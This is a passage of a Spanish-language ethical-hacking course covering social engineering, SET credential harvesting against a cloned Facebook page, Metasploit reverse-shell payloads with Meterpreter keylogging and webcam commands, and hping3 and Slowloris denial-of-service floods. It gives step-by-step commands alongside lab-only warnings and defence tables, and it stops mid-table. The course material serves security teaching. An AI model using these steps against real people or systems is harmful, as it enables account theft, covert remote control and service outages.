| Â¿QuÃ© es?          | Acceder a dispositivos detrÃ¡s de NAT sin permiso                      |
| Â¿CÃ³mo funciona?   | Mediante reverse shells, UPnP, tÃºneles                                |
| Â¿QuÃ© se necesita? | Que el dispositivo interno inicie la conexiÃ³n hacia afuera            |
| Â¿Ejemplo?         | Victima conecta por Netcat a Kali, otorgando shell                    |
| Â¿PrevenciÃ³n?      | Cortafuegos, bloqueo UPnP, monitoreo de trÃ¡fico, educaciÃ³n al usuario |

---

[ğŸ”¼](#Ã­ndice)

---

## **820. IntroducciÃ³n a la IngenierÃ­a Social**

### ğŸ§  Â¿QuÃ© es la IngenierÃ­a Social?

La **ingenierÃ­a social** es una tÃ©cnica utilizada por atacantes para **manipular psicolÃ³gicamente a las personas** con el objetivo de que revelen informaciÃ³n confidencial o realicen acciones inseguras.

ğŸ” En lugar de atacar computadoras directamente, la ingenierÃ­a social **ataca a las personas**.

---

### ğŸ¯ Objetivo principal

EngaÃ±ar a alguien para obtener:

- ContraseÃ±as
- Acceso fÃ­sico o remoto
- Archivos confidenciales
- Control sobre sistemas

---

### ğŸ§± Â¿CÃ³mo funciona?

El atacante estudia a su vÃ­ctima y busca **explotar la confianza, el miedo o la curiosidad**.

---

### ğŸ­ Tipos comunes de ataques de ingenierÃ­a social

| Tipo de Ataque | ExplicaciÃ³n                                                          | Ejemplo                                             |
| -------------- | -------------------------------------------------------------------- | --------------------------------------------------- |
| **Phishing**   | Enviar correos falsos para que la vÃ­ctima haga clic o entregue datos | "Tu cuenta fue bloqueada, haz clic aquÃ­"            |
| **Vishing**    | Llamadas falsas por telÃ©fono                                         | Llamada diciendo ser del banco                      |
| **Smishing**   | Mensajes de texto falsos                                             | SMS: â€œtu paquete estÃ¡ en camino, verifica aquÃ­â€     |
| **Pretexting** | Inventar una historia para obtener informaciÃ³n                       | "Soy del soporte tÃ©cnico, necesito tu contraseÃ±a"   |
| **Baiting**    | Usar una trampa (como un USB infectado)                              | Dejar USB marcado como â€œnÃ³mina 2025â€ en una oficina |
| **Tailgating** | Entrar detrÃ¡s de alguien a una zona restringida                      | Fingir haber olvidado la tarjeta de acceso          |

---

### ğŸ”¥ Ejemplo fÃ¡cil de entender

Imagina que eres un recepcionista en una empresa. Un hombre vestido con uniforme de mensajero llega y dice:

> â€œHola, tengo un paquete para el jefe de sistemas. Â¿Puedo pasar un momento para dejarlo en su oficina?â€

TÃº, sin confirmar su identidad, lo dejas pasar.
ğŸ“¦ En realidad, **era un atacante** que querÃ­a colocar un dispositivo o buscar informaciÃ³n confidencial.

---

#### ğŸ› ï¸ Â¿CÃ³mo se "instala" o prepara un entorno para aprender ingenierÃ­a social?

La ingenierÃ­a social **no se instala como software**, pero puedes practicarla de forma **Ã©tica y controlada** con:

#### ğŸ”§ Herramientas y entornos:

| Herramienta                       | FunciÃ³n                                                                                 |
| --------------------------------- | --------------------------------------------------------------------------------------- |
| **SET (Social-Engineer Toolkit)** | Herramienta para crear ataques como pÃ¡ginas falsas, USB infectados, correos de phishing |
| **Gophish**                       | Plataforma de simulaciÃ³n de campaÃ±as de phishing                                        |
| **Kali Linux**                    | Incluye herramientas como SET                                                           |
| **VirtualBox** o **VMware**       | Crear un entorno seguro para probar                                                     |

---

### ğŸ§° InstalaciÃ³n de SET (Social Engineer Toolkit)

#### Paso 1: Instalar SET en Kali Linux (ya viene preinstalado en Kali normalmente)

Si no lo tienes:

```bash
sudo apt update
sudo apt install set
```

O desde GitHub:

```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
sudo python3 setup.py install
```

#### Paso 2: Ejecutar SET

```bash
sudo setoolkit
```

---

### âš™ï¸ Opciones principales de SET

Cuando inicias SET, verÃ¡s un menÃº como:

```
1) Social-Engineering Attacks
2) Penetration Testing
...
```

Selecciona:

```
1) Social-Engineering Attacks
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
...
```

---

### ğŸ§ª Ejemplo prÃ¡ctico completo (entorno de laboratorio)

#### ğŸ¯ Simular un ataque de phishing en entorno controlado

##### Objetivo:

EngaÃ±ar a una vÃ­ctima simulando una pÃ¡gina de Facebook falsa y capturar sus credenciales (todo en red local, con fines educativos).

---

#### ğŸ‘£ Paso a paso:

##### âœ… Paso 1: Abrir SET

```bash
sudo setoolkit
```

Selecciona:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

SET te pedirÃ¡:

- IP de tu mÃ¡quina atacante (ej. 192.168.1.100)
- URL a clonar: escribe `https://www.facebook.com`

El sistema ahora crea un servidor web falso con la pÃ¡gina clonada.

---

##### âœ… Paso 2: Enviar el enlace falso a la vÃ­ctima

En un escenario real, podrÃ­as usar un correo falso o mensaje, pero aquÃ­ puedes decir:

> â€œEstamos haciendo una encuesta interna sobre redes sociales. Ingrese a: [http://192.168.1.100â€](http://192.168.1.100â€)

---

##### âœ… Paso 3: La vÃ­ctima entra y pone sus credenciales

- SET captura el usuario y contraseÃ±a y los muestra en la consola del atacante.

---

#### ğŸ›‘ Importante

Esto **debe hacerse solo con fines educativos y en redes de laboratorio o pruebas**. Nunca en entornos reales o con vÃ­ctimas reales sin consentimiento.

---

### ğŸ§  Â¿CÃ³mo prevenir ataques de ingenierÃ­a social?

| Medida                                  | ExplicaciÃ³n                                                                   |
| --------------------------------------- | ----------------------------------------------------------------------------- |
| ğŸ” CapacitaciÃ³n                         | EnseÃ±ar a los empleados a detectar correos falsos, llamadas sospechosas, etc. |
| ğŸ” VerificaciÃ³n                         | Nunca compartir contraseÃ±as sin validar la identidad del solicitante          |
| âš ï¸ No hacer clic en enlaces sospechosos | Ni abrir archivos de remitentes desconocidos                                  |
| ğŸ” Doble autenticaciÃ³n                  | Aunque se robe la contraseÃ±a, se bloquea el acceso                            |
| ğŸ§ª Simulaciones                         | Hacer pruebas internas de phishing para educar al personal                    |

---

### ğŸ“ Resumen final

| Tema         | ExplicaciÃ³n                                                     |
| ------------ | --------------------------------------------------------------- |
| Â¿QuÃ© es?     | TÃ©cnica que manipula personas para obtener informaciÃ³n o acceso |
| MÃ©todos      | Phishing, vishing, pretexting, baiting, tailgating              |
| Herramientas | SET, Gophish, Kali Linux                                        |
| Ejemplo      | Clonar Facebook, capturar contraseÃ±as en laboratorio            |
| PrevenciÃ³n   | CapacitaciÃ³n + seguridad tÃ©cnica                                |

---

[ğŸ”¼](#Ã­ndice)

---

## **821. Credential Harvesting**

### ğŸ§  Â¿QuÃ© es Credential Harvesting?

**Credential Harvesting**, o **recolecciÃ³n de credenciales**, es una tÃ©cnica utilizada por atacantes para **capturar nombres de usuario y contraseÃ±as** sin que la vÃ­ctima se dÃ© cuenta.

ğŸ§ª Generalmente, esto se hace mediante:

- **PÃ¡ginas falsas** (clonadas) como Facebook, Gmail, etc.
- Formularios falsos enviados por phishing
- Malware que graba lo que el usuario escribe

---

### ğŸ” Â¿Para quÃ© se usa?

Los atacantes usan las credenciales para:

- Acceder a cuentas personales o empresariales
- Robar dinero o informaciÃ³n confidencial
- Escalar privilegios dentro de una red
- Lanzar ataques posteriores (como ransomware)

---

### ğŸ­ TÃ©cnicas comunes de Credential Harvesting

| TÃ©cnica                        | DescripciÃ³n                                        | Ejemplo                                              |
| ------------------------------ | -------------------------------------------------- | ---------------------------------------------------- |
| **Phishing**                   | Correo falso que lleva a pÃ¡gina falsa              | â€œVerifica tu cuenta de correo aquÃ­â€                  |
| **ClonaciÃ³n de sitios web**    | Copia exacta de un sitio real con formulario falso | PÃ¡gina falsa de login de Office 365                  |
| **Keyloggers**                 | Software que graba lo que escribes                 | Malware que registra contraseÃ±as                     |
| **Inyecciones en formularios** | Modificar formularios legÃ­timos                    | CÃ³digo malicioso agregado a una pÃ¡gina real hackeada |
| **Captura en red**             | Interceptar contraseÃ±as en la red                  | Ataques Man-in-the-Middle                            |

---

### âš™ï¸ Herramientas mÃ¡s comunes para practicar Credential Harvesting

1. **Social-Engineer Toolkit (SET)** â€“ en Kali Linux
2. **Gophish** â€“ plataforma de simulaciÃ³n de campaÃ±as de phishing
3. **Evilginx2** â€“ proxied phishing real con captura de tokens
4. **BeEF** â€“ explotaciÃ³n desde navegadores
5. **Wireshark** â€“ captura de trÃ¡fico de red (en HTTP)

---

### ğŸ§° InstalaciÃ³n de entorno de laboratorio

#### âœ… Requisitos:

- Kali Linux (ya incluye SET)
- Una mÃ¡quina vÃ­ctima (Ubuntu, Windows o navegador real)
- Red local o VirtualBox

---

#### ğŸ“¦ Instalar SET (Social-Engineer Toolkit)

En Kali ya estÃ¡ incluido. Si no:

```bash
sudo apt update
sudo apt install set
```

O instalar desde GitHub:

```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
sudo python3 setup.py install
```

---

### âš™ï¸ Ejemplo completo: Credential Harvesting con SET

#### ğŸ¯ Objetivo:

Capturar credenciales falsas ingresadas por la vÃ­ctima en una pÃ¡gina clonada (por ejemplo, **Facebook**) usando **SET en Kali Linux**.

---

#### ğŸ‘£ Paso a paso

##### ğŸ”¹ Paso 1: Ejecutar SET

```bash
sudo setoolkit
```

VerÃ¡s un menÃº. Selecciona:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

---

##### ğŸ”¹ Paso 2: Configurar la pÃ¡gina falsa

Te pedirÃ¡:

1. **IP de tu Kali Linux** (ej: `192.168.1.100`)
2. **URL a clonar**: escribe `https://www.facebook.com` o cualquier otra

SET crearÃ¡ un servidor local con una **copia exacta de esa pÃ¡gina**.

---

##### ğŸ”¹ Paso 3: Enviar el enlace a la vÃ­ctima

En un escenario real, se hace por correo o SMS.
En laboratorio, simplemente abre el navegador en la mÃ¡quina vÃ­ctima y visita:

```
http://192.168.1.100
```

---

##### ğŸ”¹ Paso 4: VÃ­ctima ingresa sus datos

El sitio falso funciona como el real, pero cuando el usuario escribe su email y contraseÃ±aâ€¦

âœ… Â¡Kali captura los datos!

En la terminal del atacante aparecerÃ¡ algo como:

```
[*] WE GOT A HIT! Printing the output:
USERNAME: vÃ­ctima@correo.com
PASSWORD: contraseÃ±asecreta123
```

---

#### ğŸ¯ Â¿QuÃ© pasÃ³?

- La vÃ­ctima pensÃ³ que era una pÃ¡gina real
- EscribiÃ³ su usuario y contraseÃ±a
- SET capturÃ³ esos datos en texto plano

---

### ğŸ›¡ï¸ Â¿CÃ³mo prevenir ataques de Credential Harvesting?

| Medida                             | ExplicaciÃ³n                                        |
| ---------------------------------- | -------------------------------------------------- |
| âœ… Usar HTTPS siempre              | HTTPS impide la captura por red                    |
| ğŸ” Verificar URL                   | Que diga `https://facebook.com`, no `faceb00k.xyz` |
| ğŸ” Usar autenticaciÃ³n en dos pasos | Aunque roben la clave, no podrÃ¡n entrar            |
| ğŸ“§ Cuidado con correos sospechosos | No hacer clic en enlaces desconocidos              |
| ğŸš« No compartir contraseÃ±as        | Nunca por correo, telÃ©fono, ni chats               |

---

### ğŸ§  Resumen

| Elemento          | Detalle                                                    |
| ----------------- | ---------------------------------------------------------- |
| Â¿QuÃ© es?          | TÃ©cnica para robar credenciales                            |
| Â¿CÃ³mo?            | Clonando sitios, phishing, keyloggers                      |
| Herramienta usada | SET (Social-Engineer Toolkit)                              |
| PrÃ¡ctica          | Clonar sitio como Facebook y capturar credenciales         |
| PrevenciÃ³n        | Doble factor, HTTPS, verificaciÃ³n de enlaces, capacitaciÃ³n |

---

[ğŸ”¼](#Ã­ndice)

---

## **822. PreparaciÃ³n de ataques con SET y Metasploit**

### ğŸ§  Â¿QuÃ© es SET y quÃ© es Metasploit?

| Herramienta                       | DescripciÃ³n breve                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SET (Social-Engineer Toolkit)** | Herramienta diseÃ±ada para realizar ataques de **ingenierÃ­a social**, como phishing, clonado de pÃ¡ginas, envÃ­o de payloads, USBs infectados, etc.                                    |
| **Metasploit Framework**          | Plataforma poderosa para **explotar vulnerabilidades**, generar **payloads (cargas maliciosas)** y establecer **acceso remoto** a sistemas (consolas de meterpreter, shells, etc.). |

Estas herramientas juntas se usan para **engaÃ±ar al usuario (SET)** y luego **tomar el control del sistema (Metasploit)**.

---

### ğŸ§° Requisitos previos

- **Kali Linux** (ya viene con SET y Metasploit)
- **MÃ¡quina vÃ­ctima** (Windows 10, Ubuntu, o cualquier SO vulnerable)
- Red local o red virtual (VirtualBox o VMware)

---

### ğŸ”§ InstalaciÃ³n (en caso de no tener Kali Linux)

#### ğŸ”¹ Instalar SET:

```bash
sudo apt update
sudo apt install set
```

O desde GitHub:

```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
sudo python3 setup.py install
```

#### ğŸ”¹ Instalar Metasploit:

En Kali ya estÃ¡ instalado, pero si no:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | sudo bash
```

Luego lo ejecutas con:

```bash
msfconsole
```

---

### ğŸ”¥ Escenario realista (ejemplo completo paso a paso)

#### ğŸ¯ Objetivo:

Enviar un archivo malicioso (payload) a la vÃ­ctima mediante **SET**, que al ejecutarse, nos da control remoto de su equipo usando **Metasploit**.

---

#### ğŸ‘£ Paso a paso

##### ğŸ§ª Etapa 1: Crear el payload con SET

1. Ejecuta SET:

```bash
sudo setoolkit
```

2. MenÃº de SET:

```
1) Social-Engineering Attacks
```

3. Luego:

```
4) Create a Payload and Listener
```

4. Escoge el tipo de ataque:

```
1) Windows Reverse_TCP Meterpreter
```

5. Especifica la IP de tu Kali Linux (ejemplo: `192.168.1.100`)

6. Puerto de escucha: `4444` (puedes dejarlo por defecto)

7. SET generarÃ¡ un archivo malicioso, por ejemplo:

```
payload.exe -> se guardarÃ¡ en /root/.set/
```

---

##### ğŸ§ª Etapa 2: Entregar el archivo a la vÃ­ctima

ğŸ“Œ En la vida real esto puede hacerse por:

- Correo (phishing)
- USB
- PÃ¡gina falsa

Para la prÃ¡ctica, puedes copiar manualmente el archivo `payload.exe` a la mÃ¡quina vÃ­ctima.

---

##### ğŸ§ª Etapa 3: Esperar la conexiÃ³n con Metasploit

SET ejecutarÃ¡ automÃ¡ticamente el **listener** de Metasploit. Pero tambiÃ©n puedes abrir tÃº mismo Metasploit:

```bash
msfconsole
```

Y configurar el handler:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

##### âœ… Etapa 4: La vÃ­ctima ejecuta el archivo

Cuando la vÃ­ctima abre `payload.exe`, obtendrÃ¡s una **consola de meterpreter**, algo asÃ­ como:

```
[*] Meterpreter session 1 opened
meterpreter >
```

Desde aquÃ­ puedes:

- Ver archivos: `ls`
- Descargar archivos: `download`
- Tomar control remoto: `shell`
- Activar cÃ¡mara o micrÃ³fono (en Windows)

---

### ğŸ“Œ Ejemplo resumido

```bash
# En Kali
sudo setoolkit
1) Social-Engineering Attacks
4) Create a Payload and Listener
1) Windows Reverse_TCP Meterpreter
IP: 192.168.1.100
Puerto: 4444
```

Archivo generado: `payload.exe`

Ejecuta en Metasploit si no lo hace SET:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

Cuando la vÃ­ctima ejecute el archivo:

```
meterpreter >
```

Â¡Ya tienes control total de la mÃ¡quina vÃ­ctima!

---

### ğŸ›‘ Advertencia

Este tipo de prÃ¡ctica **solo debe hacerse en entornos de laboratorio o educativos**, NUNCA en redes reales o sin autorizaciÃ³n. Usar estas tÃ©cnicas fuera de un contexto Ã©tico puede ser considerado delito.

---

##3 ğŸ›¡ï¸ Â¿CÃ³mo protegerse?

| Medida                                          | ExplicaciÃ³n                           |
| ----------------------------------------------- | ------------------------------------- |
| ğŸ” No ejecutar archivos de fuentes desconocidas | Verifica extensiÃ³n y procedencia      |
| âœ… Antivirus actualizado                        | Detecta payloads comunes              |
| ğŸ›¡ï¸ Cortafuegos y monitoreo                      | Bloquea conexiones no autorizadas     |
| ğŸš« No descargar de sitios raros                 | Incluso si parecen confiables         |
| ğŸ’¡ EducaciÃ³n                                    | EnseÃ±ar sobre phishing y manipulaciÃ³n |

---

[ğŸ”¼](#Ã­ndice)

---

## **823. EjecuciÃ³n de ataques con SET y Metasploit**

### ğŸ” Â¿QuÃ© es SET?

**SET** es una herramienta de cÃ³digo abierto enfocada en **ataques de ingenierÃ­a social**, como:

- Phishing (suplantaciÃ³n de identidad)
- ClonaciÃ³n de pÃ¡ginas web
- EnvÃ­o de archivos maliciosos
- Ataques USB, ataques con Java, etc.

ğŸ“¦ Ya viene instalada por defecto en **Kali Linux**.

---

### ğŸ§° Â¿QuÃ© es Metasploit?

**Metasploit Framework** es una plataforma usada para:

- Crear y lanzar **payloads** (cargas Ãºtiles maliciosas)
- Explotar vulnerabilidades
- Obtener control de dispositivos
- Acceder a **Meterpreter**: un shell interactivo que permite hacer muchas acciones dentro del equipo atacado

---

### âš™ï¸ InstalaciÃ³n y preparaciÃ³n

#### âœ… Requisitos:

- Kali Linux (con SET y Metasploit ya instalados)
- Una mÃ¡quina vÃ­ctima (Windows 10 o Ubuntu en VirtualBox, por ejemplo)
- Ambas mÃ¡quinas conectadas en red (misma red local o adaptador puente)

---

#### ğŸ§ª Â¿Y si no tengo Kali?

Puedes instalar SET y Metasploit en Debian/Ubuntu asÃ­:

##### Instalar SET:

```bash
sudo apt update
sudo apt install set
```

##### Instalar Metasploit:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | sudo bash
```

---

### ğŸš€ **Ejemplo prÃ¡ctico completo paso a paso**

#### ğŸ¯ Objetivo:

Enviar un archivo `.exe` malicioso a una vÃ­ctima Windows.
Cuando lo abra, se conectarÃ¡ a tu mÃ¡quina Kali y tendrÃ¡s **acceso remoto total** vÃ­a **Meterpreter**.

---

##### ğŸ§ª PASO 1 â€“ Ejecutar SET

En Kali, abre una terminal y ejecuta:

```bash
sudo setoolkit
```

Luego, en los menÃºs selecciona:

```
1) Social-Engineering Attacks
4) Create a Payload and Listener
1) Windows Reverse_TCP Meterpreter
```

---

#### ğŸ”§ ParÃ¡metros que te pedirÃ¡:

- **IP de Kali Linux (LHOST)**: tu IP local (por ejemplo `192.168.1.100`)
- **Puerto de escucha (LPORT)**: usa `4444` o el que prefieras
- SET generarÃ¡ un archivo malicioso, por ejemplo:

```bash
/root/.set/reverse_tcp_payload.exe
```

ğŸ“ Este archivo deberÃ¡s **entregar a la vÃ­ctima** por algÃºn medio (correo, USB, enlace, etc.).

---

##### ğŸ§ª PASO 2 â€“ Preparar listener (Metasploit)

SET abrirÃ¡ Metasploit automÃ¡ticamente con la configuraciÃ³n correcta.
Pero si quieres hacerlo manualmente:

```bash
msfconsole
```

Y luego en la consola de Metasploit:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

Ahora estÃ¡s **esperando una conexiÃ³n** desde la vÃ­ctima.

---

##### ğŸ§ª PASO 3 â€“ Entregar el archivo malicioso a la vÃ­ctima

Puedes hacer esto:

- Subirlo a un servidor web
- Usar un USB
- Mandarlo como adjunto en un correo falso
- O copiarlo directamente si es una VM

âœ… En el entorno de laboratorio, solo copia el archivo a la mÃ¡quina vÃ­ctima.

---

##### ğŸ§ª PASO 4 â€“ VÃ­ctima ejecuta el archivo

Cuando la vÃ­ctima abra el archivo `reverse_tcp_payload.exe`, en Kali verÃ¡s:

```bash
[*] Meterpreter session 1 opened
meterpreter >
```

ğŸ‰ Â¡Ya tienes acceso completo a la mÃ¡quina vÃ­ctima!

---

##### ğŸ§ª PASO 5 â€“ Â¿QuÃ© puedes hacer con Meterpreter?

```bash
sysinfo          # Ver informaciÃ³n del sistema
getuid           # Ver usuario actual
ps               # Ver procesos activos
shell            # Entrar a la terminal
screenshot       # Tomar captura de pantalla
keyscan_start    # Comenzar a capturar teclas
webcam_snap      # Tomar una foto con la webcam
```

---

### ğŸ§  Â¿QuÃ© aprendiste aquÃ­?

| Elemento     | Detalles                                      |
| ------------ | --------------------------------------------- |
| Herramientas | SET + Metasploit                              |
| TÃ©cnica      | IngenierÃ­a social con payload remoto          |
| Objetivo     | Obtener control remoto de una mÃ¡quina vÃ­ctima |
| Resultado    | Acceso con Meterpreter                        |

---

### ğŸ” Â¿CÃ³mo prevenir este tipo de ataques?

| Medida                              | DescripciÃ³n                                       |
| ----------------------------------- | ------------------------------------------------- |
| ğŸ”’ No ejecutar archivos sospechosos | Nunca abras .exe no verificados                   |
| ğŸ›¡ï¸ Usa antivirus actualizado        | Detecta y bloquea payloads                        |
| ğŸ“§ Cuidado con el phishing          | Revisa bien correos y remitentes                  |
| ğŸ’¡ EducaciÃ³n                        | EnseÃ±a sobre ingenierÃ­a social en tu organizaciÃ³n |
| âœ… Doble factor                     | Hace inÃºtiles las contraseÃ±as robadas             |

---

[ğŸ”¼](#Ã­ndice)

---

## **824. Modelo de un ataque DoS**

![ataque DoS](../img/7_Ciberseguridad_Profesional/Modelo_de_un_ataque_DoS.webp "ataque DoS")

### ğŸ’£ Â¿QuÃ© es un Ataque DoS?

**DoS (Denial of Service)** significa "DenegaciÃ³n de Servicio".
Es un **ataque que busca hacer que un sistema, red o servicio deje de funcionar correctamente**, sobrecargÃ¡ndolo con trÃ¡fico falso o peticiones maliciosas.

---

### ğŸ§  Objetivo de un ataque DoS

- Agotar los recursos (CPU, RAM, ancho de banda)
- Saturar el servidor web, DNS o red
- Hacer que el servicio quede **fuera de lÃ­nea (caÃ­do)**

---

### ğŸ“Š Tipos de ataques DoS

| Tipo de ataque            | DescripciÃ³n                                    |
| ------------------------- | ---------------------------------------------- |
| **Flooding (inundaciÃ³n)** | EnvÃ­a muchas peticiones rÃ¡pidamente            |
| **Ping of Death**         | EnvÃ­o de paquetes ICMP malformados o grandes   |
| **SYN Flood**             | Abusa del protocolo TCP enviando mÃºltiples SYN |
| **Slowloris**             | Mantiene muchas conexiones abiertas lentamente |
| **Application Layer DoS** | Ataca servicios como HTTP o DNS directamente   |

---

### âš ï¸ Importante

> **Este tipo de ataque debe usarse solo en entornos de laboratorio y con fines educativos. Hacerlo contra servicios reales es ilegal.**

---

#### ğŸ”§ Herramientas comunes para realizar un ataque DoS

| Herramienta    | DescripciÃ³n                                  |
| -------------- | -------------------------------------------- |
| **Hping3**     | Crea paquetes personalizados de red          |
| **Slowloris**  | Ataca servidores HTTP con conexiones lentas  |
| **LOIC/HOIC**  | Ataques en masa (DoS/DDoS) con GUI           |
| **Metasploit** | Tiene mÃ³dulos DoS para servicios especÃ­ficos |
| **Scapy**      | Permite crear tus propios paquetes           |

---

### ğŸ› ï¸ InstalaciÃ³n (en Kali Linux o Ubuntu)

#### Instalar **hping3**:

```bash
sudo apt update
sudo apt install hping3
```

#### Instalar **Slowloris**:

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
```

#### Instalar **LOIC (opcional, en Windows)**:

Solo en entornos de prueba. No recomendable para principiantes en redes reales.

---

### âœ… EJEMPLO PRÃCTICO COMPLETO: Ataque DoS con **hping3**

#### ğŸ¯ Objetivo: simular un ataque SYN Flood

> Este ataque se basa en enviar muchas solicitudes SYN TCP a un puerto abierto, sin completar el "handshake", lo que agota los recursos del servidor.

---

#### ğŸ§ª Escenario de prueba

- MÃ¡quina atacante: Kali Linux
- MÃ¡quina vÃ­ctima: Ubuntu o Windows
- Ambas conectadas en red local (VirtualBox, VMware o red real)

---

##### ğŸ‘£ Paso 1: Identificar la IP de la vÃ­ctima

Ejecuta en Kali:

```bash
ping 192.168.1.101
```

(Usa la IP de tu vÃ­ctima)

---

##### ğŸ‘£ Paso 2: Ejecutar el ataque con hping3

```bash
sudo hping3 -S --flood -V -p 80 192.168.1.101
```

ğŸ” ExplicaciÃ³n de parÃ¡metros:

| ParÃ¡metro | Significado                          |
| --------- | ------------------------------------ |
| `-S`      | Enviar paquetes TCP SYN              |
| `--flood` | EnvÃ­a paquetes lo mÃ¡s rÃ¡pido posible |
| `-p 80`   | Ataca el puerto 80 (HTTP)            |
| `-V`      | Modo verboso (ver informaciÃ³n)       |

---

##### ğŸ‘ï¸ Paso 3: Ver efectos en la vÃ­ctima

En la mÃ¡quina vÃ­ctima, puedes usar:

```bash
htop    # Para ver uso de CPU
netstat -an | grep :80   # Para ver conexiones entrantes
```

VerÃ¡s muchas conexiones SYN abiertas.

---

##### ğŸ§¼ Paso 4: Detener el ataque

Presiona `Ctrl + C` para detener hping3.

---

#### ğŸ§ª EJEMPLO ALTERNATIVO: Ataque con Slowloris

```bash
python3 slowloris.py 192.168.1.101
```

Este ataque funciona bien contra servidores HTTP mal configurados.

---

### ğŸ§± Â¿CÃ³mo defenderse?

| Defensa                      | AcciÃ³n                                 |
| ---------------------------- | -------------------------------------- |
| ğŸ”¥ Firewall                  | Limitar nÃºmero de conexiones por IP    |
| ğŸ›¡ï¸ IDS/IPS (Snort, Suricata) | Detectar patrones sospechosos          |
| â³ Timeouts cortos           | Cerrar conexiones lentas o incompletas |
| ğŸš« Rate limiting             | Limitar trÃ¡fico excesivo por segundo   |
| ğŸš€ CloudFlare o WAFs         | Filtrar y absorber ataques HTTP        |

---

### ğŸ“š Resumen

| Tema         | ExplicaciÃ³n                                 |
| ------------ | ------------------------------------------- |
| Â¿QuÃ© es DoS? | Ataque para inutilizar un sistema o red     |
| Herramientas | hping3, slowloris, LOIC, etc.               |
| InstalaciÃ³n  | `apt install hping3`, `git clone slowloris` |
| Ejemplo      | Ataque SYN Flood a puerto 80                |
| Defensa      | Firewalls, IDS, lÃ­mites por IP              |

---

[ğŸ”¼](#Ã­ndice)

---

## **825. Ataques ICMP y SYN Flood**

![Ataques ICMP y SYN Flood](../img/7_Ciberseguridad_Profesional/Ataques_ICMP_SYN_Flood.png "Ataques ICMP y SYN Flood")

### ğŸ“Œ Â¿QuÃ© son estos ataques?

Tanto **ICMP Flood** como **SYN Flood** son **ataques de denegaciÃ³n de servicio (DoS)**.

Su objetivo es **interrumpir el funcionamiento de un servidor o red** enviando paquetes en exceso, hasta que el sistema se vuelva lento o deje de responder.

---

### ğŸ“˜ 1. ICMP Flood Attack (Ping Flood)

#### ğŸ§  Â¿QuÃ© es ICMP?

- ICMP es el protocolo que usa el comando `ping`.
- Sirve para diagnosticar si una mÃ¡quina estÃ¡ **activa o accesible**.

#### â— Â¿QuÃ© es un ICMP Flood?

- Es enviar **miles de pings por segundo** a una mÃ¡quina destino.
- La vÃ­ctima intenta responder a todos, consumiendo **ancho de banda y CPU**.

#### ğŸ’¡ Resultado:

- La red o sistema vÃ­ctima **se satura** y deja de responder.

---

### ğŸ“˜ 2. SYN Flood Attack

#### ğŸ§  Â¿QuÃ© es un paquete SYN?

- Es el primer paso en la **conexiÃ³n TCP**: el "apretÃ³n de manos" entre cliente y servidor.
- Una conexiÃ³n TCP se inicia asÃ­:

  ```
  Cliente -> SYN -> Servidor
  Servidor -> SYN/ACK -> Cliente
  Cliente -> ACK -> Servidor (conexiÃ³n completa)
  ```

#### â— Â¿QuÃ© es un SYN Flood?

- Se envÃ­an **miles de paquetes SYN falsos** pero **nunca se completa la conexiÃ³n**.
- El servidor queda esperando ACKs que nunca llegan.
- AsÃ­ **consume recursos** (RAM, puertos, CPU).

#### ğŸ’¡ Resultado:

- El servidor no puede aceptar conexiones reales. Queda "congelado".

---

### ğŸ› ï¸ Herramientas necesarias

Trabajaremos con **Kali Linux**, pero puedes usar cualquier Linux con las siguientes herramientas:

#### âœ… Instala hping3:

```bash
sudo apt update
sudo apt install hping3
```

---

### ğŸ¯ Escenario del laboratorio

- ğŸ–¥ï¸ MÃ¡quina atacante: **Kali Linux**
- ğŸ–¥ï¸ MÃ¡quina vÃ­ctima: **Windows o Ubuntu**
- ğŸŒ Conectadas en la **misma red local (LAN o VirtualBox)**

---

#### ğŸ§ª Parte 1: Ejemplo de Ataque **ICMP Flood**

##### ğŸ‘£ Paso 1: Verifica la IP de la vÃ­ctima

Ejecuta:

```bash
ping 192.168.1.101
```

(Usa la IP real de tu mÃ¡quina vÃ­ctima)

##### ğŸ‘£ Paso 2: Ejecuta el ataque

```bash
sudo hping3 -1 --flood 192.168.1.101
```

ğŸ“Œ ExplicaciÃ³n:

| OpciÃ³n    | Significado               |
| --------- | ------------------------- |
| `-1`      | Usa protocolo ICMP (ping) |
| `--flood` | Enviar paquetes sin parar |

âœ… Este comando **envÃ­a miles de pings por segundo** a la vÃ­ctima.

##### ğŸ” Paso 3: Observar efectos

En la mÃ¡quina vÃ­ctima (Windows):

- Abre el **Administrador de tareas** o el comando:

  ```cmd
  netstat -an
  ```

- VerÃ¡s **uso alto de red**, o que **no responde al ping**.

---

#### ğŸ§ª Parte 2: Ejemplo de Ataque **SYN Flood**

##### ğŸ‘£ Paso 1: Ejecuta el ataque desde Kali

```bash
sudo hping3 -S --flood -V -p 80 192.168.1.101
```

ğŸ“Œ ExplicaciÃ³n:

| OpciÃ³n    | Significado                         |
| --------- | ----------------------------------- |
| `-S`      | Enviar paquetes SYN                 |
| `--flood` | Enviar lo mÃ¡s rÃ¡pido posible        |
| `-p 80`   | Atacar el puerto 80 (HTTP)          |
| `-V`      | Modo verbose (ver salida detallada) |

##### ğŸ” Paso 2: Ver efectos en la vÃ­ctima

En la vÃ­ctima, usa:

```bash
netstat -ant | grep SYN_RECV
```

VerÃ¡s **muchas conexiones incompletas** en estado `SYN_RECV`.

---

### â›” Â¿CÃ³mo detener los ataques?

Presiona `Ctrl + C` en Kali para detener hping3.

---

#### ğŸ§± Â¿CÃ³mo defenderse?

| Defensa                      | DescripciÃ³n                                 |
